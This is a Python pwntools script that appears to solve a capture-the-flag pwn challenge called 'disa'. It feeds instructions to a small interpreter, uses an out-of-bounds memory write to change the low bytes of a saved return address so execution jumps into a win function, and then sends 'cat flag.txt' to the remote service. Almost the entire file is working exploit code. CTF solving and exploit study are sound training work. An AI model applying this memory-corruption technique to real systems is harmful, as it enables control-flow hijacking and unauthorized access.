#!/usr/bin/env python3

from pwn import *

exe = ELF("disa_patched")

context.binary = exe
context.terminal = ['alacritty', '-e', 'bash', '-c']

LOCAL = False
DEBUG = False

HOST = "challs.pwnoh.io"
PORT = 13430

gdbscript = '''
b *interpreter+633
c
'''


if LOCAL:
    if DEBUG:
        r = gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        r = process([exe.path])
else:
    r = remote(HOST, PORT)


program = []

def store():
    # cells[addr] = dat;
    program.append(b'ST')

def load():
    # dat = cells[addr];
    program.append(b'LD')

def put(val: int):
    """
        tmp = atoi(buf + 4);
        if (tmp >= MIN_VAL_SIGNED && tmp <= MAX_VAL_SIGNED) {
            dat = tmp;
        } else {
            puts("nuh uh uh");
        }
    """
    program.append(b'PUT ' + str(val).encode())

def jmp():
    # addr = dat;
    program.append(b'JMP')

def add():
    # cells[addr] += dat;
    program.append(b'ADD')

def read():
    # printf("%d\n", dat);
    program.append(b'RD')

def done():
    # break
    program.append(b'END')


#TODO: store offset val in cell 0
# offset is 0x4028//2 (0x2024)
put(0xfff)
add()
add()
put(22)
add()

# make addr point to bottom 2 bytes of return address
load() # dat is offset
read()
jmp() # addr is offset
load() # read value at addr for debugging, should end in 0x53b I think
read()

# Overwrite bottom 2 bytes to win+36
put(0xd00)
for _ in range(19):
    add()
put(0x612)
add()
done()


r.recvuntil(b'program:')
for insn in program:
    r.sendline(insn)

r.sendline(b'cat flag.txt')

r.interactive()
